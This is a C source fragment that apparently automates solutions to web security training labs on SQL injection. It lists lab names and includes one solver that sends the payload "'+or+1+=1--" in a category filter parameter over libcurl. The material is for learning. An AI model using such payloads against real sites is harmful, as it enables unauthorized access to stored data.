
//            {"SQL injection vulnerability allowing login bypass",                                   2},
//            {"SQL injection attack, querying the database type and version on Oracle",              3},
//            {"SQL injection attack, querying the database type and version on MySQL and Microsoft", 4},
//            {"SQL injection attack, listing the database contents on non-Oracle databases",         5},
//            {"SQL injection attack, listing the database contents on Oracle",                       6},
//            {"SQL injection UNION attack, determining the number of columns returned by the query", 7},
//            {"SQL injection UNION attack, finding a column containing text",                        8},
//            {"SQL injection UNION attack, retrieving data from other tables",                       9},
//            {"SQL injection UNION attack, retrieving multiple values in a single column",           10},
//            {"Blind SQL injection with conditional responses",                                      11},
//            {"Blind SQL injection with conditional errors",                                         12},
//            {"Visible error-based SQL injection",                                                   13},
//            {"Blind SQL injection with time delays",                                                14},
//            {"Blind SQL injection with time delays and information retrieval",                      15}

// Lab name: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
int sqli_lab1_solution(char* url, CURL* curl, char* response_buffer) {
     strncat(url, "/filter?category=Accessories'+or+1+=1--", 39);
     curl_easy_setopt(curl, CURLOPT_URL, url);

     if (performCurlRequest(curl, response_buffer) != 0)
        return -1;
}